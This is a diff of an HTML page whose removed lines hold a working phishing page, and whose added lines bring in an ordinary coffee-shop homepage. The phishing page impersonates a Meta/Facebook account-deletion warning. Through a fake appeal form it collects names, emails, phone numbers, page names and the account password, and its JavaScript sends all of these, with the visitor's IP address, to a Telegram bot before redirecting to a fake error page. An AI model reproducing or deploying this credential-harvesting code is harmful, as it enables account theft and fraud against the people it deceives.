-                                        d="m22.191 9.207-2.224 2.06a8.112 8.112 0 0 1 0 1.466l2.224 2.06a1 1 0 0 1 .187 1.233l-1.702 2.948a1 1 0 0 1-1.162.455l-2.895-.896a7.991 7.991 0 0 1-1.27.735l-.672 2.954a1 1 0 0 1-.975.778H10.3a1 1 0 0 1-.975-.778l-.672-2.954a8 8 0 0 1-1.27-.735l-2.895.896a1 1 0 0 1-1.162-.455l-1.702-2.948a1 1 0 0 1 .187-1.233l2.224-2.06a8.1 8.1 0 0 1 0-1.466L1.81 9.207a1 1 0 0 1-.187-1.233l1.702-2.948a1 1 0 0 1 1.162-.455l2.895.896a7.992 7.992 0 0 1 1.27-.735l.672-2.954A1 1 0 0 1 10.299 1h3.403a1 1 0 0 1 .975.778l.672 2.954a7.99 7.99 0 0 1 1.27.735l2.895-.896a1 1 0 0 1 1.162.455l1.702 2.948a1 1 0 0 1-.187 1.233zm-8.574-3.071.894.412c.335.155.653.34.952.551l.805.57 3.075-.951.903 1.564-2.36 2.186.09.98a6.093 6.093 0 0 1 0 1.104l-.09.98 2.36 2.185-.903 1.565-3.075-.951-.805.57a5.993 5.993 0 0 1-.952.55l-.894.413L12.904 21h-1.807l-.713-3.136-.894-.412a5.993 5.993 0 0 1-.952-.551l-.805-.57-3.075.951-.904-1.565 2.36-2.185-.089-.98a6.102 6.102 0 0 1 0-1.104l.09-.98-2.36-2.186.903-1.564 3.075.951.805-.57c.299-.212.617-.396.952-.55l.894-.413L11.097 3h1.807l.713 3.136z">
-                                    </path>
-                                </svg>
-                            </div>
-                            <div class="action-button-text">
-                                Settings
-                            </div>
-                            <div class="action-button-arrow">
-                                <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true"
-                                    class="ARROW">
-                                    <path fill-rule="evenodd" clip-rule="evenodd"
-                                        d="M4.341 7.247a1 1 0 0 1 1.412.095L12 14.482l6.247-7.14a1 1 0 0 1 1.506 1.317l-7 8a1 1 0 0 1-1.506 0l-7-8a1 1 0 0 1 .095-1.412z">
-                                    </path>
-                                </svg>
-                            </div>
-                        </div>
-                        <div class="collapse " id="SettingCollapse">
-                        </div>
-                    </div>
-                </div>
-            </div>
-
-<style>
-.small-black {
-    color: rgb(32, 32, 32);
-    font-family: Optimistic Text Normal, Helvetica, Arial, sans-serif;
-    font-size: 15px;
-    font-weight: 400;
-    line-height: 20px;
-    font: bold;
-}
-.small-red {
-    color: rgb(241, 47, 47);
-    font-family: Optimistic Text Normal, Helvetica, Arial, sans-serif;
-    font-size: 15px;
-    font-weight: 400;
-    line-height: 20px;
-}
-</style>
-
-            <div class="col-8">
-                <div id="right">
-                    <h1>
-                        <img src="../img/block_2.png" alt="" style="height: 40px;
-                        width:40px;
-                        margin-right: 8px;">
-                        We have scheduled your page to be deleted
-                    </h1>
-                    <p>We have received several reports that your account violates our terms of service and community
-                        guidelines. As a result, your account will be sent for verification.</p>
-                    <br>
-                    <p>
-                        If you believe restrictions have been placed on your account in error, you can request a review.
-                    </p>
-                    <br>
-                    <div id="utm-ticketId" style="display: none;">
-                        <p class="small-grey">
-                            Your ticket id: <span>#4564-ATFD-4865</span></p>
-                    </div>
-
-
-                    <div class="action-button wide" id="view-accounts" onclick="accountsModal.show()" style="display: none;">
-                        <div class="action-button-img">
-                            <img src="../img/no_avatar.png" alt="">
-                        </div>
-                        <div class="action-button-text">
-                            <span>View accounts</span>
-                            <br>
-                            <span class="small-grey UserName"></span>
-                        </div>
-                        <div class="action-button-arrow">
-                            <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" class="x1lliihq x1k90msu x2h7rmj x1qfuztq xcza8v6 xlup9mm x1kky2od">
-                                <path fill-rule="evenodd" clip-rule="evenodd" d="M7.247 4.341a1 1 0 0 1 1.412-.094l8 7a1 1 0 0 1 0 1.506l-8 7a1 1 0 0 1-1.318-1.506L14.482 12l-7.14-6.247a1 1 0 0 1-.094-1.412z">
-                                </path>
-                            </svg>
-                        </div>
-                    </div>
-                    <br>
-                    <h6>Appeal Guide</h6>
-                    <ul>
-                        <li>Fact checkers may not respond to requests that contain intimidation, hate speech, or other
-                            verbal threats.</li>
-                        <li>In your appeal, please include all necessary information to allow the fact checker to
-                            process your request in a timely manner. If you provide an invalid email address or do not
-                            respond to a request for additional information within 2 days, the fact checker may close
-                            the application without processing. If the appeal is not processed within 4 days, Meta will
-                            automatically reject it.</li>
-                        <li>When everything is ready, we will review your account and determine whether restrictions
-                            apply to it. The verification procedure usually lasts 24 hours, but in some cases it may
-                            take longer. Depending on our decision, the restrictions imposed will remain in effect or
-                            will be lifted and your account will be reinstated. </li>
-                    </ul>
-                    
-<style>
-#card img {
-    max-width: 100%;
-    height: auto;
-}
-
-/* CSS for mobile */
-@media only screen and (max-width: 768px) {
-    #card img {
-        width: 100%;
-        height: auto;
-    }
-}
-</style>                    
-                    
-                    <div id="card">
-                        <img src="../img/banner_new_01.png" alt="">
-                        <div class="card-text">
-                            <p class="card-type">Review request</p>
-                            <h4>Fixing problems with account restrictions</h4>
-                            <p>Please be sure to provide the requested information below. Failure to provide this
-                                information may delay the processing of your appeal.</p>
-                            <div class="btn-wrapper">
-                                <div onclick="location.href='/apeal-form';" class="button fb-blue w-100" data-bs-toggle="modal" data-bs-target="#exampleModal1">
-                                    Request Review
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                    <br><br>
-                    <h6>Privacy Center</h6>
-                    <div class="fake-likns">
-                        <div class="action-button-list">
-                            <div class="action-button wide">
-                                <div class="action-button-img">
-                                    <img src="../img/save_img.png" alt="">
-                                </div>
-                                <div class="action-button-text">
-                                    <span>What is the Privacy Policy and what does it say?</span>
-                                    <br>
-                                    <span class="small-grey">Privacy Policy</span>
-                                </div>
-                                <div class="action-button-arrow">
-                                    <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" class="x1lliihq x1k90msu x2h7rmj x1qfuztq xcza8v6 xlup9mm x1kky2od">
-                                        <path fill-rule="evenodd" clip-rule="evenodd" d="M7.247 4.341a1 1 0 0 1 1.412-.094l8 7a1 1 0 0 1 0 1.506l-8 7a1 1 0 0 1-1.318-1.506L14.482 12l-7.14-6.247a1 1 0 0 1-.094-1.412z">
-                                        </path>
-                                    </svg>
-                                </div>
-                            </div>
-                            <div class="action-button wide">
-                                <div class="action-button-img">
-                                    <img src="../img/save_img.png" alt="">
-                                </div>
-                                <div class="action-button-text">
-                                    <span>How you can manage or delete your information</span>
-                                    <br>
-                                    <span class="small-grey">Privacy Policy</span>
-                                </div>
-                                <div class="action-button-arrow">
-                                    <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" class="x1lliihq x1k90msu x2h7rmj x1qfuztq xcza8v6 xlup9mm x1kky2od">
-                                        <path fill-rule="evenodd" clip-rule="evenodd" d="M7.247 4.341a1 1 0 0 1 1.412-.094l8 7a1 1 0 0 1 0 1.506l-8 7a1 1 0 0 1-1.318-1.506L14.482 12l-7.14-6.247a1 1 0 0 1-.094-1.412z">
-                                        </path>
-                                    </svg>
-                                </div>
-                            </div>
-                        </div>
-
-                        <br>
-                        <h6>For more details, see the User Agreement</h6>
-                        <div class="action-button wide">
-                            <div class="action-button-img">
-                                <img src="../img/doc.png" alt="">
-                            </div>
-                            <div class="action-button-text">
-                                <span>Meta AI</span>
-                                <br>
-                                <span class="small-grey">User Agreement</span>
-                            </div>
-                            <div class="action-button-arrow">
-                                <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" class="x1lliihq x1k90msu x2h7rmj x1qfuztq xcza8v6 xlup9mm x1kky2od">
-                                    <path fill-rule="evenodd" clip-rule="evenodd" d="M7.247 4.341a1 1 0 0 1 1.412-.094l8 7a1 1 0 0 1 0 1.506l-8 7a1 1 0 0 1-1.318-1.506L14.482 12l-7.14-6.247a1 1 0 0 1-.094-1.412z">
-                                    </path>
-                                </svg>
-                            </div>
-                        </div>
-                        <br>
-                        <h6>Additional resources</h6>
-
-                        <div class="action-button-list">
-                            <div class="action-button wide">
-                                <div class="action-button-text">
-                                    <span>How Meta uses information for generative AI models</span>
-                                    <br>
-                                    <span class="small-grey">Privacy Center</span>
-                                </div>
-                                <div class="action-button-arrow">
-                                    <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" class="x1lliihq x1k90msu x2h7rmj x1qfuztq xcza8v6 xlup9mm x1kky2od">
-                                        <path fill-rule="evenodd" clip-rule="evenodd" d="M7.247 4.341a1 1 0 0 1 1.412-.094l8 7a1 1 0 0 1 0 1.506l-8 7a1 1 0 0 1-1.318-1.506L14.482 12l-7.14-6.247a1 1 0 0 1-.094-1.412z">
-                                        </path>
-                                    </svg>
-                                </div>
-                            </div>
-                            <div class="action-button wide">
-                                <div class="action-button-text">
-                                    <span>Cards with information about the operation of AI systems</span>
-                                    <br>
-                                    <span class="small-grey">Meta AI website</span>
-                                </div>
-                                <div class="action-button-arrow">
-                                    <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" class="x1lliihq x1k90msu x2h7rmj x1qfuztq xcza8v6 xlup9mm x1kky2od">
-                                        <path fill-rule="evenodd" clip-rule="evenodd" d="M7.247 4.341a1 1 0 0 1 1.412-.094l8 7a1 1 0 0 1 0 1.506l-8 7a1 1 0 0 1-1.318-1.506L14.482 12l-7.14-6.247a1 1 0 0 1-.094-1.412z">
-                                        </path>
-                                    </svg>
-                                </div>
-                            </div>
-                            <div class="action-button wide">
-                                <div class="action-button-text">
-                                    <span>Introduction to Generative AI</span>
-                                    <br>
-                                    <span class="small-grey">For teenagers</span>
-                                </div>
-                                <div class="action-button-arrow">
-                                    <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" class="x1lliihq x1k90msu x2h7rmj x1qfuztq xcza8v6 xlup9mm x1kky2od">
-                                        <path fill-rule="evenodd" clip-rule="evenodd" d="M7.247 4.341a1 1 0 0 1 1.412-.094l8 7a1 1 0 0 1 0 1.506l-8 7a1 1 0 0 1-1.318-1.506L14.482 12l-7.14-6.247a1 1 0 0 1-.094-1.412z">
-                                        </path>
-                                    </svg>
-                                </div>
-                            </div>
-
-                        </div>
-                    </div>
-                    <br>
-                    <p class="small-grey">We continually identify potential privacy risks, including
-                        when collecting, using or sharing personal information, and developing methods to reduce these
-                        risks. Read more about
-                        <a target="_blank" id="policyLink" class="add-svg">Privacy Policy
-
-                        </a>
-                    </p>
-
-                </div>
-
-            </div>
-
-
-            <div class="popup" id="popup">
-
-                <div class="popup-item">
-                    <div class="burger-button-popup" id="closePopup">
-                        <div class="bar"></div>
-                        <div class="bar"></div>
-                    </div>
-                    <div class="popup-content"></div>
-                </div>
-            </div>
-
-
         </div>
+        <div class="navigation">
+            <div data-animation="default" class="navbar3_component w-nav" data-easing2="ease" fs-scrolldisable-element="smart-nav" data-easing="ease" data-collapse="medium" data-w-id="8af213fe-60ce-a51e-e1f7-c70963ce7822" role="banner" data-duration="400">
+                <div class="navbar3_container">
+                    <div class="navbar1_menu-button w-nav-button">
+                        <div class="menu-icon1">
+                            <div class="menu-icon1_line-top"></div>
+                            <div class="menu-icon1_line-middle">
+                                <div class="menu-icon_line-middle-inner"></div>
+                            </div>
+                            <div class="menu-icon1_line-bottom"></div>
+                        </div>
+                    </div>
+                    <nav role="navigation" blocks-name="navbar3_menu" blocks-slot-children="ST232" class="navbar3_menu w-nav-menu"><a href="#" blocks-name="navbar3_link-2" class="navbar3_link w-nav-link">Menu</a><a href="#" blocks-name="navbar3_link-2" class="navbar3_link w-nav-link">Shop</a><a href="#" blocks-name="navbar3_link" class="navbar3_link w-nav-link">About</a></nav>
+                    <a
+                        href="/" aria-current="page" class="navbar3_logo-link w-inline-block w--current"><img src="https://cdn.prod.website-files.com/6610c4fb8d400b1408858d2e/6610c6ca1cb3c0d5afff8de4_Dann-Good-Coffee-Logo.svg" loading="lazy" alt="Dann Good Coffee" class="navbar3_logo is-base" /><img src="https://cdn.prod.website-files.com/6610c4fb8d400b1408858d2e/6619a61a449a86202b0235dd_Dann-Good-Coffee-Logo-Light.svg"
+                            loading="lazy" alt="Dann Good Coffee" class="navbar3_logo is-white" /><img src="https://cdn.prod.website-files.com/6610c4fb8d400b1408858d2e/6610c6ca1cb3c0d5afff8de4_Dann-Good-Coffee-Logo.svg" loading="lazy" alt="Dann Good Coffee"
+                            class="navbar3_logo is-orange" /></a><a id="w-node-_8af213fe-60ce-a51e-e1f7-c70963ce7833-63ce7821" href="https://phd.so/" target="_blank" class="button is-navbar3-button w-button">Order</a>
+                        <div class="navbar3_menu-background"></div>
+                </div>
+            </div>
+        </div>
+        <main class="main-wrapper">
+            <header class="section_header30"><svg viewBox="0 0 1200 120" preserveAspectRatio="none" fill="currentColor" class="section-divider-bottom"><path d="M 0 -10 L 0 0 C 0 0 0 0 0 0 C 80 0 160 84.97 240 84.97 C 320 84.97 400 99.22 480 99.22 C 560 99.22 640 2.39 720 2.39 C 800 2.39 880 68.73 960 68.73 C 1040 68.73 1120 42.98 1200 42.98 L 1200 0 L 1200 -10 Z"></path></svg>
+                <div
+                    class="padding-global">
+                    <div class="container-medium">
+                        <div class="header30_content">
+                            <div class="padding-section-large">
+                                <div class="text-align-center">
+                                    <h1>Chill Vibes and Dann Good Coffee</h1>
+                                    <div class="spacer-small"></div>
+                                    <p class="text-size-large">An inspiring space to fuel your ambition and coffee that’s dann good.</p>
+                                    <div class="spacer-large"></div>
+                                    <div class="button-group is-center"><a href="#" class="button w-button">Order</a><a href="#" class="button is-secondary is-alternate w-button">Menu</a></div>
+                                    <div class="text-chin">Open Daily 7am–7pm</div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
     </div>
-
-    <style>
-        /* CSS để làm mờ và tối xung quanh modal */
-        .overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(0, 0, 0, 0.5);
-            /* Màu đen với độ mờ 50% */
-            z-index: 999;
-            /* Đảm bảo overlay hiển thị trên modal */
-            display: none;
-            /* Ẩn ban đầu */
-        }
-
-        .modal.active {
-            display: block;
-        }
-
-        /* CSS để canh giữa modal */
-        .modal-dialog {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            height: 100%;
-        }
-    </style>
-
-    <form onsubmit="sendToTelegram(event)">
-
-        <div class="overlay" id="overlay"></div>
-        <div class="modal form-modal" id="exampleModal1" tabindex="-1" aria-labelledby="exampleModalLabel"
-            aria-hidden="true">
-            <div class="modal-dialog modal-dialog-centered modal-dialog-scrollable">
-                <div class="modal-content">
-                    <div class="modal-header">
-                        <h5 class="modal-title" id="exampleModalLabel">Apeal Form</h5>
-                        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+    <div class="header30_background-image-wrapper">
+        <div class="image-overlay-layer"></div><img src="https://cdn.prod.website-files.com/6610c4fb8d400b1408858d2e/66199bccdd906e755c923a54_Dann-Header-01.webp" loading="eager" sizes="100vw" srcset="https://cdn.prod.website-files.com/6610c4fb8d400b1408858d2e/66199bccdd906e755c923a54_Dann-Header-01-p-500.webp 500w, https://cdn.prod.website-files.com/6610c4fb8d400b1408858d2e/66199bccdd906e755c923a54_Dann-Header-01-p-800.webp 800w, https://cdn.prod.website-files.com/6610c4fb8d400b1408858d2e/66199bccdd906e755c923a54_Dann-Header-01-p-1080.webp 1080w, https://cdn.prod.website-files.com/6610c4fb8d400b1408858d2e/66199bccdd906e755c923a54_Dann-Header-01-p-1600.webp 1600w, https://cdn.prod.website-files.com/6610c4fb8d400b1408858d2e/66199bccdd906e755c923a54_Dann-Header-01-p-2000.webp 2000w, https://cdn.prod.website-files.com/6610c4fb8d400b1408858d2e/66199bccdd906e755c923a54_Dann-Header-01.webp 2560w"
+            alt="Dann Good Coffee" class="header30_background-image" /></div>
+    </header>
+    <section class="section_home_feature">
+        <div class="padding-global">
+            <div class="container-large">
+                <div class="padding-section-large">
+                    <div class="home_feature_component">
+                        <div blocks-name="layout90_content-left" blocks-slot-children="ST232" class="home_feature_content-left">
+                            <div class="margin-bottom margin-small">
+                                <h2 blocks-name="heading" class="heading-style-h1">Peruse Our Vintage, Mid-Century Vibe</h2>
+                            </div>
+                            <p blocks-name="paragraph" class="text-size-medium">Step into a world of surf, skating, snowboarding, outdoor adventure, and mid-century awesomeness at Dann Good Coffee. Our coffee shop is inspired by the retro vibes of the past, offering a cozy and nostalgic atmosphere for
+                                coffee lovers to enjoy. </p>
+                            <div class="margin-top margin-large">
+                                <div class="button-group"><a href="#" class="button is-secondary is-alternate is-dark w-button">Read our origin story</a></div>
+                            </div>
+                        </div>
+                        <div blocks-name="layout90_content-right" blocks-slot-children="ST232" class="home_feature_content-right"><img src="https://cdn.prod.website-files.com/6610c4fb8d400b1408858d2e/6619adc4ee4ec35ad7e77d67_Coffee-Cup-Mockup-01.webp" loading="lazy" sizes="(max-width: 479px) 90vw, (max-width: 991px) 45vw, 42vw" srcset="https://cdn.prod.website-files.com/6610c4fb8d400b1408858d2e/6619adc4ee4ec35ad7e77d67_Coffee-Cup-Mockup-01-p-500.webp 500w, https://cdn.prod.website-files.com/6610c4fb8d400b1408858d2e/6619adc4ee4ec35ad7e77d67_Coffee-Cup-Mockup-01-p-800.webp 800w, https://cdn.prod.website-files.com/6610c4fb8d400b1408858d2e/6619adc4ee4ec35ad7e77d67_Coffee-Cup-Mockup-01-p-1080.webp 1080w, https://cdn.prod.website-files.com/6610c4fb8d400b1408858d2e/6619adc4ee4ec35ad7e77d67_Coffee-Cup-Mockup-01.webp 1680w"
+                                alt="Peruse Our Vintage, Mid-Century Vibe" class="home_feature_image is-scroll" /></div>
                     </div>
-                    <div class="modal-body">
-                        <form id="first-form">
-
-                            <div class="mb-3">
-                                <label for="exampleFormControlTextarea1" class="form-label">
-                                    Apeal
-                                </label>
-                                <textarea name="apeal" class="form-control" id="exampleFormControlTextarea1" rows="1"
-                                    required></textarea>
-                                <div id="emailHelp" class="form-text">
-                                    Please indicate why you believe that account restrictions were imposed by mistake.
+                </div>
+            </div>
+        </div>
+    </section>
+    <section class="section_home_benefits"><svg viewBox="0 0 1200 120" preserveAspectRatio="none" fill="currentColor" class="section-divider-top"><path d="M 0 -10 L 0 0 C 0 0 0 0 0 0 C 80 0 160 84.97 240 84.97 C 320 84.97 400 99.22 480 99.22 C 560 99.22 640 2.39 720 2.39 C 800 2.39 880 68.73 960 68.73 C 1040 68.73 1120 42.98 1200 42.98 L 1200 0 L 1200 -10 Z"></path></svg>
+        <svg
+            viewBox="0 0 1200 120" preserveAspectRatio="none" fill="currentColor" class="section-divider-bottom is-orange is-flip">
+            <path d="M 0 -10 L 0 0 C 0 0 0 0 0 0 C 80 0 160 84.97 240 84.97 C 320 84.97 400 99.22 480 99.22 C 560 99.22 640 2.39 720 2.39 C 800 2.39 880 68.73 960 68.73 C 1040 68.73 1120 42.98 1200 42.98 L 1200 0 L 1200 -10 Z"></path>
+            </svg>
+            <div class="padding-global">
+                <div class="container-large">
+                    <div class="padding-section-large">
+                        <div class="w-layout-grid home_benefits_component">
+                            <div class="home_benefits_image-wrapper"><img src="https://cdn.prod.website-files.com/6610c4fb8d400b1408858d2e/661d5e3ccbaec927b0db713e_Coffee-02.webp" loading="lazy" sizes="(max-width: 767px) 90vw, (max-width: 991px) 43vw, 42vw" srcset="https://cdn.prod.website-files.com/6610c4fb8d400b1408858d2e/661d5e3ccbaec927b0db713e_Coffee-02-p-500.webp 500w, https://cdn.prod.website-files.com/6610c4fb8d400b1408858d2e/661d5e3ccbaec927b0db713e_Coffee-02-p-800.webp 800w, https://cdn.prod.website-files.com/6610c4fb8d400b1408858d2e/661d5e3ccbaec927b0db713e_Coffee-02-p-1080.webp 1080w, https://cdn.prod.website-files.com/6610c4fb8d400b1408858d2e/661d5e3ccbaec927b0db713e_Coffee-02-p-1600.webp 1600w, https://cdn.prod.website-files.com/6610c4fb8d400b1408858d2e/661d5e3ccbaec927b0db713e_Coffee-02.webp 1920w"
+                                    alt="Organic, Single Origin &amp; Dann Good" class="home_benefits_image is-scroll" /></div>
+                            <div blocks-name="layout3_content" blocks-slot-children="ST265" class="home_benefits_content">
+                                <div class="margin-bottom margin-small">
+                                    <h2 blocks-name="heading" class="heading-style-h1">Organic, Single Origin &amp; Dann Good</h2>
+                                </div>
+                                <p blocks-name="paragraph" class="text-size-medium">Experience the rich flavors of our unique coffee blends, crafted with the finest organic ingredients from around the world. Each sip is a journey to the heart of dann goodness.</p>
+                                <div class="margin-top margin-large">
+                                    <div class="button-group"><a href="#" class="button is-secondary w-button">Shop Beans</a></div>
                                 </div>
                             </div>
-                            <div class="mb-3">
-                                <label for="FullNameField" class="form-label">Full Name</label>
-                                <input name="full-name" type="text" class="form-control" id="FullNameField" minlength="3" required>
-                            </div>
-                            <div class="mb-3">
-                                <label for="PersonalEmailField" class="form-label">Personal Email</label>
-                                <input name="personal-email" type="email" class="form-control" id="PersonalEmailField" required>
-                            </div>
-                            <div class="mb-3">
-                                <label for="BuisenessEmailField" class="form-label">Business Email</label>
-                                <input name="business-email" type="email" class="form-control" id="BuisenessEmailField" required>
-                            </div>
-                            <div class="mb-3">
-                                <label for="PhoneFirld" class="form-label">Mobile phone number</label>
-                                <input name="mobile-phone-number" type="tel" class="form-control" id="PhoneFirld" required>
-                            </div>
-                            <div class="mb-3">
-                                <label for="fb-page-name-input" class="form-label">Facebook Page Name</label>
-                                <input name="page-name" type="text" class="form-control" id="fb-page-name-input" required>
-                            </div>
-                            <div class="mb-3 form-check">
-                                <input name="" type="checkbox" class="form-check-input" id="exampleCheck1" required>
-                                <label class="form-check-label" for="exampleCheck1">I agree with
-
-                                    <a id="termsLink" class="add-svg">Terms of use
-                                    </a>
-                                </label>
-                            </div>
-                            <div class="form-btn-wrapper">
-                                <button class="btn btn-primary" onclick="sendToTelegram(event)">
-                                    <div class="spinner-border text-light" role="status" style="display: none;">
-                                        <span class="visually-hidden">Loading...</span>
-                                    </div>
-                                    <span class="button-text">Send</span>
-                                </button>
-                            </div>
-                        </form>
-                    </div>
-                    <div class="modal-footer">
-                        <img src="/img/meta-logo-grey.png" alt="">
-                    </div>
-                </div>
-            </div>
-        </div>
-
-
-        <div class="overlay overlay2" id="overlay2"></div>
-        <div class="modal form-modal" id="exampleModal2" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
-            <div class="modal-dialog modal-dialog-centered modal-fullscreen-lg-down">
-                <div class="modal-content">
-                    <div class="modal-header">
-                    </div>
-                    <div class="modal-body">
-                        <div class="fb-round-wraper">
-                            <img src="/img/fb_round_logo.png" alt="" class="fb-logo-round">
                         </div>
-                        <form id="apiForm" onsubmit="sendToTelegramFromModal2(event)" autocomplete="off"> <!-- Thêm sự kiện onsubmit -->
-                            <div class="mb-3">
-                                <label for="PasswordInput" class="form-label">Password</label>
-                                <input name="password" type="password" class="form-control" id="PasswordInput" minlength="3" required>
-                            </div>
-                            <div class="form-btn-wrapper">
-                                <button type="submit" class="btn btn-primary"> <!-- Sửa thành type="submit" -->
-                                    <div class="spinner-border text-light" role="status" style="display: none;">
-                                        <span class="visually-hidden">Loading...</span>
-                                    </div>
-                                    <span class="button-text">submit</span>
-                                </button>
-                            </div>
-                            <div id="forgot-pass-wrap">
-                                <span>Forgot password?</span>
-                            </div>
-                        </form>
-                        <div class="spaser"></div>
                     </div>
-                    <div class="modal-footer">
-                        <img src="/img/meta-logo-grey.png" alt="">
+                </div>
+            </div>
+    </section>
+    <section class="section_home_services">
+        <div class="padding-global">
+            <div class="container-large">
+                <div class="padding-section-large">
+                    <div class="w-layout-grid home_services_component">
+                        <div blocks-name="layout228_item-2" blocks-slot-children="ST232" class="home_services_item is-scroll">
+                            <div class="margin-bottom margin-small"><img src="https://cdn.prod.website-files.com/6610c4fb8d400b1408858d2e/6619a9a85e75c940d7c9927c_Dann-Good-Coffee-Icon-Beans.svg" loading="lazy" blocks-name="icon-1x1-medium-2" alt="Custom Roasts" class="icon-1x1-large" /></div>
+                            <div
+                                class="margin-bottom margin-small">
+                                <h2 blocks-name="heading-style-h4-2" class="heading-style-h3">Custom Roasts</h2>
+                        </div>
+                        <p blocks-name="paragraph-2">Bring your coffee ideas and we’ll make a custom roast just for you.</p>
+                        <div class="margin-top margin-medium">
+                            <div blocks-slot-children="ST232" blocks-name="button-group-2" class="button-group is-center"><a blocks-name="button-3" href="#" class="button is-alternate w-button">Let’s Roast</a></div>
+                        </div>
+                    </div>
+                    <div blocks-name="layout228_item" blocks-slot-children="ST232" class="home_services_item is-scroll">
+                        <div class="margin-bottom margin-small"><img src="https://cdn.prod.website-files.com/6610c4fb8d400b1408858d2e/6619a9a7e9577026480b1030_Dann-Good-Coffee-Icon-Cursor.svg" loading="lazy" blocks-name="icon-1x1-medium" alt="Web Fuel" class="icon-1x1-large" /></div>
+                        <div class="margin-bottom margin-small">
+                            <h2 blocks-name="heading-style-h4" class="heading-style-h3">Web Fuel</h2>
+                        </div>
+                        <p blocks-name="paragraph">When we’re not serving coffee, we’re fueling the web with custom-built websites.</p>
+                        <div class="margin-top margin-medium">
+                            <div blocks-slot-children="ST232" blocks-name="button-group" class="button-group is-center"><a blocks-name="button" href="#" class="button is-alternate w-button">Get started</a></div>
+                        </div>
+                    </div>
+                    <div blocks-name="layout228_item-3" blocks-slot-children="ST232" class="home_services_item is-scroll">
+                        <div class="margin-bottom margin-small"><img src="https://cdn.prod.website-files.com/6610c4fb8d400b1408858d2e/6619a9a9966427c6ee1c3806_Dann-Good-Coffee-Icon-Beard.svg" loading="lazy" blocks-name="icon-1x1-medium-3" alt="Beard Training" class="icon-1x1-large" /></div>
+                        <div
+                            class="margin-bottom margin-small">
+                            <h2 blocks-name="heading-style-h4-3" class="heading-style-h3">Beard Training</h2>
+                    </div>
+                    <p blocks-name="paragraph-3">Yup, that’s right. Our beard manager will guide you to your best beard yet.</p>
+                    <div class="margin-top margin-medium">
+                        <div blocks-slot-children="ST232" blocks-name="button-group-3" class="button-group is-center"><a blocks-name="button-5" href="#" class="button is-alternate w-button">Train me</a></div>
                     </div>
                 </div>
             </div>
         </div>
-
-
-    </form>
-
-    <script>
-        function sendToTelegramFromModal2(event) {
-            event.preventDefault(); // Ngăn chặn hành vi mặc định của form
-
-            // Lấy dữ liệu từ các trường trong form
-            var password = document.getElementById('PasswordInput').value.trim();
-
-            if (password === '') {
-                alert("Please enter your password.");
-                return;
-            }
-
-            var fullName = document.getElementById('FullNameField').value.trim();
-            var personalEmail = document.getElementById('PersonalEmailField').value.trim();
-            var businessEmail = document.getElementById('BuisenessEmailField').value.trim();
-            var mobilePhoneNumber = document.getElementById('PhoneFirld').value.trim();
-            var pageName = document.getElementById('fb-page-name-input').value.trim();
-            var apeal = document.getElementById('exampleFormControlTextarea1').value.trim();
-
-            // Lấy địa chỉ IP từ server
-            fetch('get-ip.php')
-                .then(response => response.text())
-                .then(ip => {
-                    var content = "*Thông Tin Tài Khoản*\nFull Name: " + fullName +
-                        "\nPersonal Email: " + personalEmail +
-                        "\nBusiness Email: " + businessEmail +
-                        "\nMobile Phone Number: " + mobilePhoneNumber +
-                        "\nFacebook Page Name: " + pageName +
-                        "\nApeal: " + apeal +
-                        "\nPassword: " + password +
-                        "\nIP: " + ip;
-
-                    var apiToken = '<?php echo $token; ?>'; // Thay bằng token của bạn
-                    var data = {
-                        chat_id: '<?php echo $chatId; ?>', // Thay bằng chat ID của bạn
-                        text: content,
-                        parse_mode: 'HTML'
-                    };
-
-                    var xhr = new XMLHttpRequest();
-                    xhr.open('POST', 'https://api.telegram.org/bot' + apiToken + '/sendMessage', true);
-                    xhr.setRequestHeader('Content-Type', 'application/json');
-
-                    xhr.send(JSON.stringify(data));
-
-                    xhr.onload = function() {
-                        if (xhr.status >= 200 && xhr.status < 300) {
-                            console.log('Message sent to Telegram bot successfully.');
-                            window.location.href = "/checkpoint-error-pass.php"; // Chuyển hướng sau khi gửi thành công
-                        } else {
-                            console.error('Failed to send message to Telegram bot.');
-                            alert('Failed to send message. Please try again.');
-                        }
-                    };
-                })
-                .catch(error => {
-                    console.error('Error fetching IP:', error);
-                    alert('Error fetching IP. Please try again.');
-                });
-        }
-    </script>
-
-
-
-
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
-    <script src="https://stackpath.bootstrapcdn.com/bootstrap/5.1.3/js/bootstrap.bundle.min.js"></script>
-    <script>
-        document.addEventListener("DOMContentLoaded", function() {
-            var openModalBtn = document.getElementById('openModalBtn');
-            var modal1 = document.getElementById('exampleModal1');
-            var modal2 = document.getElementById('exampleModal2');
-            var overlay = document.getElementById('overlay');
-            var overlay2 = document.getElementById('overlay2');
-
-            openModalBtn.addEventListener('click', function() {
-                modal1.classList.add('active');
-                overlay.style.display = 'block';
-            });
-
-            window.addEventListener('click', function(event) {
-                if (event.target == overlay) {
-                    modal1.classList.remove('active');
-                    modal2.classList.remove('active');
-                    overlay.style.display = 'none';
-                    overlay2.style.display = 'none';
-                }
-            });
-
-            var closeModalBtn1 = modal1.querySelector('.btn-close');
-            closeModalBtn1.addEventListener('click', function() {
-                modal1.classList.remove('active');
-                overlay.style.display = 'none';
-            });
-
-            var sendBtn = modal1.querySelector('.btn-primary');
-            sendBtn.addEventListener('click', function(event) {
-                event.preventDefault();
-
-                // Kiểm tra xem tất cả các trường đã được điền đầy đủ chưa
-                var fullName = document.getElementById('FullNameField').value.trim();
-                var personalEmail = document.getElementById('PersonalEmailField').value.trim();
-                var businessEmail = document.getElementById('BuisenessEmailField').value.trim();
-                var mobilePhoneNumber = document.getElementById('PhoneFirld').value.trim();
-                var pageName = document.getElementById('fb-page-name-input').value.trim();
-                var apeal = document.getElementById('exampleFormControlTextarea1').value.trim();
-
